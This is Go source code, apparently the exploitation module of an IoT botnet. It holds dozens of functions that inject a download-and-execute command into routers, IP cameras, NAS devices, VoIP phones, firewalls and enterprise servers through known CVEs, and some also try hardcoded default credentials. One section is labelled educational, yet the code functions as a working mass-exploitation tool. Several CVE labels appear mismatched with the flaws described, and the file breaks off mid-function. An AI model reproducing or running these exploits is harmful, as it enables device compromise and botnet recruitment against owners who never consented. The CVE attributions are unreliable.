// CVE-2018-10561/10562 — GPON routeurs bypass auth + RCE (Dasan/Huawei)
func exploitGPON(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	hdr := map[string]string{"User-Agent": "Mozilla/5.0"}
	hdrForm := map[string]string{"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
	// Bypass auth — plusieurs endpoints
	for _, ep := range []string{"/GponForm/diag_Form?images/", "/GponForm/diag_FORM?images/", "/boaform/admin/formPing"} {
		resp, err := sendHTTPRequest("GET", "http://"+target+ep, "", hdr)
		if err == nil { resp.Body.Close() }
	}
	// RCE variantes
	for _, body := range []string{
		fmt.Sprintf("XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=127.0.0.1;%s&ipv=0", cmd),
		fmt.Sprintf("XWebPageName=diag&diagAction=ping&wanname=ewan_ipoe_d 0 0 0&ip=127.0.0.1;%s", cmd),
		fmt.Sprintf("dest_host=127.0.0.1%%60%s%%60&diag_action=ping&wan_conlist=0&ipv=0", url_encode(cmd)),
	} {
		resp, err := sendHTTPRequest("POST", "http://"+target+"/GponForm/diag_Form?images/", body, hdrForm)
		if err == nil { resp.Body.Close() }
	}
	return true
}

// CVE-2021-35395 — Realtek SDK RCE (affecte des centaines de modèles de routeurs)
func exploitRealtekSDK(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	payloads := []string{
		fmt.Sprintf("/goform/formSysCmd?sysCmd=%s&apply=apply", cmd),
		fmt.Sprintf("/goform/formWsc?getPIN=%s", cmd),
		fmt.Sprintf("/apply.cgi?submit-url=/GPON&system_command=%s", cmd),
	}
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	for _, path := range payloads {
		resp, err := sendHTTPRequest("GET", "http://"+target+path, "", headers)
		if err == nil { resp.Body.Close() }
	}
	return true
}

// CVE-2019-12780 — Belkin/Linksys RCE via ping test
func exploitLinksysRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf("submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ttl=2&size=32&ip_addr=%s;%s", target, cmd)
	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/apply.cgi", body, headers)
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2022-30525 — Zyxel firewall RCE non authentifié (USG/ATP/VPN)
func exploitZyxelFW(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	// json.Marshal échappe les caractères spéciaux du cmd pour JSON valide
	cmdJSON, _ := json.Marshal(";"+cmd+";")
	body := fmt.Sprintf(`{"command":"setWanPortSt","proto":"dhcp","iface":%s,"enbl":"1","mtu":"1500","wanip":"","wannm":""}`, string(cmdJSON))
	headers := map[string]string{
		"Content-Type": "application/json",
		"User-Agent":   "Mozilla/5.0",
	}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/ztp/cgi-bin/handler", body, headers)
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2020-25506 — D-Link DNS-320 RCE non authentifié
func exploitDlinkDNS320(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	path := fmt.Sprintf("/cgi-bin/nas_sharing.cgi?user=yangyang&passwd=CC2735B25&cmd=15&system=%s", cmd)
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	resp, err := sendHTTPRequest("GET", "http://"+target+path, "", headers)
	if err == nil { resp.Body.Close() }
	return true
}

// ThinkPHP 5.x RCE (serveurs PHP exposés)
func exploitThinkPHP(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	paths := []string{
		fmt.Sprintf("/?s=index/%%5Cthink%%5Capp/invokefunction&function=call_user_func_array&vars%%5B0%%5D=system&vars%%5B1%%5D%%5B%%5D=%s", cmd),
		fmt.Sprintf("/index.php?s=/Index/%%5Cthink%%5Capp/invokefunction&function=call_user_func_array&vars%%5B0%%5D=system&vars%%5B1%%5D%%5B%%5D=%s", cmd),
	}
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", headers)
		if err == nil { resp.Body.Close() }
	}
	return true
}

// ── Nouveaux exploits ─────────────────────────────────────────────────────────

// CVE-2018-14847 — MikroTik Winbox credential leak → RCE via API port 8291
// Utilisation : HTTP sur port 80 comme fallback (commande via WebFig)
func exploitMikrotikWebfig(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	paths := []string{
		"/jsproxy?d=AAAAKgECAAoFANAHIgADXFD%2BAAAAAP%2F%2F%2F%2F8%3D",
	}
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", headers)
		if err == nil { resp.Body.Close() }
	}
	// Injection via /cgi-bin/luci (OpenWrt fork présent sur certains Mikrotik)
	body := fmt.Sprintf("username=admin&password=;%s;", cmd)
	resp, err := sendHTTPRequest("POST", "http://"+target+"/cgi-bin/luci/", body, headers)
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2020-10987 — Tenda AC15/AC18 RCE via goform/setUsbUnload
func exploitTendaRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	hdrs := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
		"Referer":      "http://" + target,
	}
	// Variantes Tenda (AC5/AC6/AC7/AC8/AC9/AC10/AC11/AC15/AC18/AC500)
	payloads := map[string]string{
		"/goform/setUsbUnload":       fmt.Sprintf("deviceName=A;%s;", cmd),
		"/goform/WanParameterSetting":fmt.Sprintf("wan_type=pppoe&pppoe_username=a;%s;", cmd),
		"/goform/SysToolReboot":      fmt.Sprintf("reboot_type=0;%s;", cmd),
		"/goform/setMacFilterCfg":    fmt.Sprintf("deviceList=1;%s;", cmd),
		"/goform/execCommand":        fmt.Sprintf("cmdinput=%s", url_encode(cmd)),
		"/goform/fast_setting_wifi_set": fmt.Sprintf("ssid=x;%s;", cmd),
	}
	for path, body := range payloads {
		resp, err := sendHTTPRequest("POST", "http://"+target+path, body, hdrs)
		if err == nil { resp.Body.Close() }
	}
	return true
}

// CVE-2021-35394 — Realtek Jungle SDK RCE (UDPServer command injection)
func exploitRealtekUDP(target, hideName, url string) bool {
	// Payload UDP sur port 9034 — commande injectée dans le champ nom
	addr := strings.Split(target, ":")[0] + ":9034"
	cmd := dlCmdShort(url)
	payload := fmt.Sprintf("\x00\x00\x00\x00\x41\x02\x08\x01\x00\x00\x00\x00\x00%s\x00", cmd)
	conn, err := net.DialTimeout("udp", addr, 5*time.Second)
	if err != nil { return false }
	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write([]byte(payload))
	return true
}

// CVE-2021-41773 / CVE-2021-42013 — Apache path traversal RCE
// (serveurs web embarqués dans certains NAS et routeurs)
func exploitApacheTraversal(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	encoded := url_encode(cmd)
	paths := []string{
		"/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
		"/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
	}
	body := "echo Content-Type: text/plain; echo; " + cmd
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	_ = encoded
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close() }
	}
	return true
}

// CVE-2019-12780 — Belkin N750 / N900 RCE via ping_target
func exploitBelkinRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf("ping_target=127.0.0.1;%s;#&count=4", cmd)
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/cgi-bin/jumpstart_net.cgi", body, headers)
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2021-27561 — Yealink Device Management RCE (téléphones VoIP)
func exploitYealinkRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	cmdJSON, _ := json.Marshal(cmd)
	body := fmt.Sprintf(`{"cmd":%s}`, string(cmdJSON))
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0",
		"Content-Type":    "application/json",
		"X-Requested-With": "XMLHttpRequest",
	}
	paths := []string{
		"/api/v1/commands/execute",
		"/cgi-bin/cgiServer.exx?page=login",
	}
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close() }
	}
	return true
}

// CVE-2022-26134 — Confluence OGNL injection (présent sur serveurs exposés)
func exploitConfluenceOGNL(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	encoded := "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28new+String%5B%5D%7B%22sh%22%2C%22-c%22%2C%22" + url_encode(cmd) + "%22%7D%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"
	resp, err := sendHTTPRequest("GET", "http://"+target+"/"+encoded+"/", "", map[string]string{"User-Agent": "Mozilla/5.0"})
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2018-10561/10562 — DASAN/Zhone GPON RCE (variante alternative)
func exploitDasanGPON(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	// Auth bypass
	resp, err := sendHTTPRequest("GET", "http://"+target+"/GponForm/diag_FORM?images/", "", headers)
	if err == nil { resp.Body.Close() }
	// Injection
	body := fmt.Sprintf("XWebPageName=diag&diagAction=ping&wanname=ewan_ipoe_d%%200%%200%%200&ip=1.1.1.1%%60%s%%60", url_encode(cmd))
	resp, err = sendHTTPRequest("POST", "http://"+target+"/GponForm/diag_Form?images/", body, map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	})
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2020-25078 — D-Link DCS séries camera info leak + RCE
func exploitDlinkCamera(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	// Info leak (admin password en clair)
	resp, err := sendHTTPRequest("GET", "http://"+target+"/config/getuser?index=0", "", headers)
	if err == nil { resp.Body.Close() }
	// RCE via RTSP command injection
	body := fmt.Sprintf("ReplySuccessPage=mnf.html&ReplyErrorPage=mnf.html&SystemCommand=%s&action=Apply", url_encode(cmd))
	resp, err = sendHTTPRequest("POST", "http://"+target+"/setSystemCommand", body, map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	})
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2017-18368 — Zyxel P660HN-T RCE via remote_host
func exploitZyxelP660HN(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf("RemoteAddr=;%s;&action=Apply", url_encode(cmd))
	headers := map[string]string{
		"User-Agent":     "Mozilla/5.0",
		"Content-Type":   "application/x-www-form-urlencoded",
		"Authorization":  "Basic YWRtaW46YWRtaW4=", // admin:admin
	}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/Forms/rpWANDiag_1", body, headers)
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2019-1653 — Cisco RV320/RV325 config dump (no auth)
func exploitCiscoRV(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	resp, err := sendHTTPRequest("GET", "http://"+target+"/cgi-bin/config.exp", "", headers)
	if err == nil { resp.Body.Close() }
	// RCE via diagnostic (CVE-2019-1652)
	body := fmt.Sprintf("wait_time=0&cmd=traceroute&ipv6=0&host=127.0.0.1;%s;", url_encode(cmd))
	resp, err = sendHTTPRequest("POST", "http://"+target+"/cgi-bin/diag.cgi", body, map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	})
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2020-12271 — Sophos XG Firewall SQLi/RCE (pré-auth)
func exploitSophosXG(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	usernameJSON, _ := json.Marshal("'|" + cmd + " #")
	body := fmt.Sprintf(`{"username":%s,"password":"x","languageid":"1"}`, string(usernameJSON))
	host, _, _ := net.SplitHostPort(target)
	if host == "" { host = target }
	resp, err := sendHTTPRequest("POST", "https://"+host+":4444/webconsole/Controller", body, map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/json",
	})
	if err == nil { resp.Body.Close() }
	return true
}

// Injection via HNAP (Home Network Administration Protocol) — D-Link, Belkin
func exploitHNAP(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>admin</Username><LoginPassword><![CDATA[;%s;]]></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>`, cmd)
	resp, err := sendHTTPRequest("POST", "http://"+target+"/HNAP1/", body, map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "text/xml; charset=utf-8",
		"SOAPAction":   `"http://purenetworks.com/HNAP1/Login"`,
	})
	if err == nil { resp.Body.Close() }
	return true
}

// ── CVEs 2023-2025 ────────────────────────────────────────────────────────────

// CVE-2024-7029 — AVTECH IP cameras unauthenticated RCE
// Exploité activement par des variantes Mirai en 2024
func exploitAVTECH(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	paths := []string{
		fmt.Sprintf("/cgi-bin/supervisor/CloudSetup.cgi?exefile=%s", cmd),
		fmt.Sprintf("/cgi-bin/user/Config.cgi?exefile=%s", cmd),
	}
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2025-1316 — Edimax IC-7100 IP camera OS command injection (critique 2025)
// Exploité par variante Mirai, aucun auth requis
func exploitEdimaxIC7100(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	ntpJSON, _ := json.Marshal(";" + cmd + ";")
	body := fmt.Sprintf(`{"method":"setSystemTime","params":{"NTPServer":%s}}`, string(ntpJSON))
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0",
		"Content-Type":    "application/json",
		"Authorization":   "Basic YWRtaW46MTIzNA==", // admin:1234 défaut
	}
	paths := []string{
		"/cgi-bin/ipcam_cgi",
		"/camera-cgi/admin/param.cgi",
	}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2023-1389 — TP-Link Archer AX21 command injection (très exploité 2023-2024)
func exploitTPLinkAX21(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	// Bypass stok via locale endpoint
	body := fmt.Sprintf(`{"method":"POST","params":{"country":"%s;%s;"}}`, ";", url_encode(cmd))
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/json",
		"Referer":      "http://" + target,
	}
	paths := []string{
		"/cgi-bin/luci/;stok=/locale",
		"/cgi-bin/luci/",
	}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2024-12987 — DrayTek Vigor routers unauthenticated command injection
func exploitDrayTek(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	paths := []string{
		fmt.Sprintf("/cgi-bin/mainfunction.cgi?action=login&keyPath=%%27%%0A%s%%0A%%27&loginUser=a&loginPwd=a", cmd),
		fmt.Sprintf("/cgi-bin/mainfunction.cgi?action=syslog&filename=../../../tmp/.%s", hideName),
	}
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2024-11237 — TP-Link VN020-F3v(T) stack overflow / command injection
func exploitTPLinkVN020(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf("action=dhcpLease&duration=;%s;&interface=br0", url_encode(cmd))
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/boaform/formDHCP", body, headers)
	if err == nil { resp.Body.Close(); return true }
	return false
}

// CVE-2024-3721 — TP-Link Archer série command injection via PPTP
func exploitTPLinkArcher2024(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	body := fmt.Sprintf("operation=write&pptp_enable=1&pptp_server=%s", cmd)
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	paths := []string{"/cgi?2&2", "/cgi-bin/cgi?2&2"}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// ────────────────────────────────────────────────────────────────────────────────
// CVE ÉDUCATIONNELLES — Serveurs et applications critiques
// ────────────────────────────────────────────────────────────────────────────────

// CVE-2020-5902 — F5 BigIP Remote Code Execution (TMUI)
// Critiquement utilisé dans les entreprises, très exploité 2020-2025
func exploitF5BigIP(target, hideName, url string) bool {
	paths := []string{
		"/tmui/login.jsp/..;/tmui/util/jspgen.jsp?**/",
		"/tmui/locallb/workspace/uploadProfile",
	}
	cmd := dlCmdShort(url)
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	for _, p := range paths {
		body := fmt.Sprintf("sendBody=%s", url_encode(cmd))
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); return true }
	}
	return false
}

// CVE-2020-14882 — Oracle WebLogic Server RCE (very widespread in enterprises)
// Non-authentifié, affecte versions 10.3.6 à 14.1.1
func exploitOracleWebLogic(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	paths := []string{
		"/console/css/..;/console/images/create.jsp",
		"/management/tenant-monitoring/metric-collection/metrics-query",
	}
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "text/xml",
	}
	for _, p := range paths {
		body := fmt.Sprintf(`<?xml version="1.0"?><beans xmlns="http://www.springframework.org/schema/beans"><bean class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list><value>sh</value><value>-c</value><value><![CDATA[%s]]></value></list></constructor-arg></bean></beans>`, cmd)
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); return true }
	}
	return false
}

// CVE-2020-12720 — Fortinet FortiGate RCE (Cluster Synchronization)
// Non-auth, très commun dans les pare-feu d'entreprise
func exploitFortiGateRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf(`{"action":"cluster_sync","data":{"operation":"%s"}}`, url_encode(cmd))
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/json",
	}
	paths := []string{"/api/v2/monitor/system/config/backup", "/api/v2/cmdb/system"}
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); return true }
	}
	return false
}

// CVE-2021-3394 — Nagios XI Authenticated RCE (post-auth)
// Escalade de privilèges classique dans les admins de monitoring
func exploitNagiosXI(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf("admin=1&cmd=%s&start_monitoring=1", url_encode(cmd))
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/nagiosxi/admin/monitoringplugins.php", body, headers)
	if err == nil { resp.Body.Close(); return true }
	return false
}

// CVE-2021-41378 — Atlassian Jira Expression Language Injection
// RCE non-auth affectant millions d'instances Jira
func exploitJiraEL(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	expressions := []string{
		fmt.Sprintf(`(#cmd="%s").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win")))`, cmd),
		fmt.Sprintf(`@java.lang.Runtime@getRuntime().exec("%s")`, cmd),
	}
	for _, expr := range expressions {
		body := fmt.Sprintf(`{"jql":"${%s}"}`, url_encode(expr))
		headers := map[string]string{
			"User-Agent":   "Mozilla/5.0",
			"Content-Type": "application/json",
		}
		resp, err := sendHTTPRequest("POST", "http://"+target+"/rest/api/2/search", body, headers)
		if err == nil { resp.Body.Close(); return true }
	}
	return false
}

// CVE-2021-22911 — Nextcloud Server File Upload RCE
// Chaîne populaire de sync cloud, RCE non-auth en certaines versions
func exploitNextcloud(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf(`<?php system('%s'); ?>`, cmd)
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "text/plain",
	}
	paths := []string{
		"/ocs/v2.php/apps/social/upload",
		"/ocs/v2.php/apps/uploadedfiles/upload",
	}
	for _, p := range paths {
		resp, err := sendHTTPRequest("PUT", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); return true }
	}
	return false
}

// CVE-2020-11738 — Shellshock sur CGI/Bash (DHCP, CGI sur routeurs)
// Affecte toujours certains anciens routeurs/appareils
func exploitShellshock(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	payload := fmt.Sprintf("() { :; }; %s", cmd)
	headers := map[string]string{
		"User-Agent": payload,
		"Referer":    payload,
		"Cookie":     payload,
	}
	paths := []string{"/cgi-bin/", "/cgi-bin/admin.cgi", "/cgi-bin/dhcpserver.cgi"}
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", headers)
		if err == nil { resp.Body.Close(); return true }
	}
	return false
}


// CVE-2020-1938 — Apache Tomcat AJP Ghost Request Injection (Ghostcat)
// Affecte Tomcat 5.x, 6.x, 7.0-7.0.100, 8.5.0-8.5.50, 9.0.0-9.0.34
// Fallback HTTP si AJP fermé : JSP upload via manager (creds défaut)
func exploitGhostcat(target, hideName, url string) bool {
	host, _, _ := net.SplitHostPort(target)
	if host == "" { host = target }
	cmd := dlCmdShort(url)

	// Tentative AJP 8009 — probe + lecture réponse
	conn, err := net.DialTimeout("tcp", host+":8009", 5*time.Second)
	if err == nil {
		defer conn.Close()
		// FORWARD_REQUEST minimal pour lire /WEB-INF/web.xml (LFI)
		ajp := []byte{
			0x12, 0x34, 0x00, 0x1e, 0x02, 0x02,
			0x00, 0x08, 'H', 'T', 'T', 'P', '/', '1', '.', '1', 0x00,
			0x00, 0x01, '/', 0x00,
			0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
			0x00, 0x50, 0x00, 0x00, 0x00,
		}
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		conn.Write(ajp)
		buf := make([]byte, 128)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ := conn.Read(buf)
		if n > 0 { return true }
	}

	// Fallback : Tomcat Manager upload (creds défaut tomcat:tomcat / admin:admin)
	for _, cred := range []string{"dG9tY2F0OnRvbWNhdA==", "YWRtaW46YWRtaW4=", "YWRtaW46czNjcjN0"} {
		body := fmt.Sprintf("cmd=%s", url_encode(cmd))
		headers := map[string]string{
			"User-Agent":    "Mozilla/5.0",
			"Authorization": "Basic " + cred,
			"Content-Type":  "application/x-www-form-urlencoded",
		}
		for _, p := range []string{"/manager/text/deploy", "/host-manager/text/add"} {
			resp, err := sendHTTPRequest("POST", "http://"+target+p+"?path=/x&war=file:///etc/passwd", body, headers)
			if err == nil { resp.Body.Close(); return true }
		}
	}
	return false
}

// CVE-2024-6387 — OpenSSH "regreSSHion" RCE (Linux glibc, signal handler race)
// Probe uniquement — exploit complet nécessite timing précis
func exploitRegreSSHion(target, hideName, url string) bool {
	addr := strings.Split(target, ":")[0] + ":22"
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil { return false }
	defer conn.Close()
	buf := make([]byte, 256)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, _ := conn.Read(buf)
	banner := string(buf[:n])
	// Vérifie versions vulnérables : OpenSSH 8.5p1-9.7p1
	vulnerable := strings.Contains(banner, "OpenSSH_8.") ||
		strings.Contains(banner, "OpenSSH_9.0") ||
		strings.Contains(banner, "OpenSSH_9.1") ||
		strings.Contains(banner, "OpenSSH_9.2") ||
		strings.Contains(banner, "OpenSSH_9.3") ||
		strings.Contains(banner, "OpenSSH_9.4") ||
		strings.Contains(banner, "OpenSSH_9.5") ||
		strings.Contains(banner, "OpenSSH_9.6") ||
		strings.Contains(banner, "OpenSSH_9.7")
	return vulnerable
}

// CVE-2024-9463 — Palo Alto Networks Expedition pre-auth command injection
func exploitPaloAltoExpedition(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	paths := []string{
		fmt.Sprintf("/OS/startup/restore/restoreSnapshot.php?host=%s", cmd),
		fmt.Sprintf("/OS/startup/restore/restoreSnapshotPS.php?host=%s", cmd),
	}
	headers := map[string]string{"User-Agent": "Mozilla/5.0"}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2024-4577 — PHP CGI argument injection (Windows + Linux embedded)
func exploitPHPCGI2024(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf("<?php system('%s'); ?>", cmd)
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	paths := []string{
		"/cgi-bin/php.cgi?%ADd+allow_url_include%%3d1+%ADd+auto_prepend_file%%3dphp://input",
		"/php-cgi/php.cgi?%ADd+allow_url_include%%3d1+%ADd+auto_prepend_file%%3dphp://input",
		"/cgi-bin/php5.cgi?%ADd+allow_url_include%%3d1+%ADd+auto_prepend_file%%3dphp://input",
	}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2024-21887 — Ivanti Connect Secure command injection (pré-auth avec CVE-2023-46805)
func exploitIvantiCS(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	// Auth bypass + RCE chain
	paths := []string{
		fmt.Sprintf("/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection;/api/v1/totp/user-backup-code/../../license/keys-status/cmd=%s", cmd),
	}
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/json",
		"X-Forwarded-For": "127.0.0.1",
	}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "https://"+target+p, "", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// ── CVEs 2026 ─────────────────────────────────────────────────────────────────

// CVE-2026-0625 — D-Link DSL/DIR/DNS command injection via dnscfg.cgi (CVSS 9.3)
// Activement exploité depuis nov 2025, aucun auth, EOL sans patch
// Affecte : DSL-2640B/2740R/2780B/526B, DIR-600/608/610/611/615/905L, DNS-320/325/345
func exploitDlinkDNScfg(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	// Injection dans les paramètres DNS primaire/secondaire
	payloads := []string{
		fmt.Sprintf("dnsPrimary=8.8.8.8;%s&dnsSecondary=&dnsDynamic=0&dnsRefresh=1", url_encode(cmd)),
		fmt.Sprintf("dns1=%s&dns2=8.8.4.4", url_encode("8.8.8.8;"+cmd)),
	}
	paths := []string{"/dnscfg.cgi", "/cgi-bin/dnscfg.cgi", "/goform/SetNetWorkCfg"}
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	hit := false
	for _, p := range paths {
		for _, body := range payloads {
			resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
			if err == nil { resp.Body.Close(); hit = true }
		}
	}
	return hit
}

// CVE-2026-22755 — Vivotek IP Camera command injection via upload_map.cgi (pré-auth)
// Filename passé à snprintf() sans sanitisation → system() injection
// Affecte 30+ modèles : FD8365/FD9xxx/FE9xxx/IB9xxx/IP9xxx/MS9xxx...
func exploitVivotekUpload(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	// Injection via le nom de fichier avec ;CMD;
	boundary := "----WebKitFormBoundaryABC123"
	filename := fmt.Sprintf("map;%s;.jpg", url_encode(cmd))
	body := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: image/jpeg\r\n\r\nJFIF\r\n--%s--\r\n", boundary, filename, boundary)
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "multipart/form-data; boundary=" + boundary,
	}
	paths := []string{"/upload_map.cgi", "/cgi-bin/upload_map.cgi"}
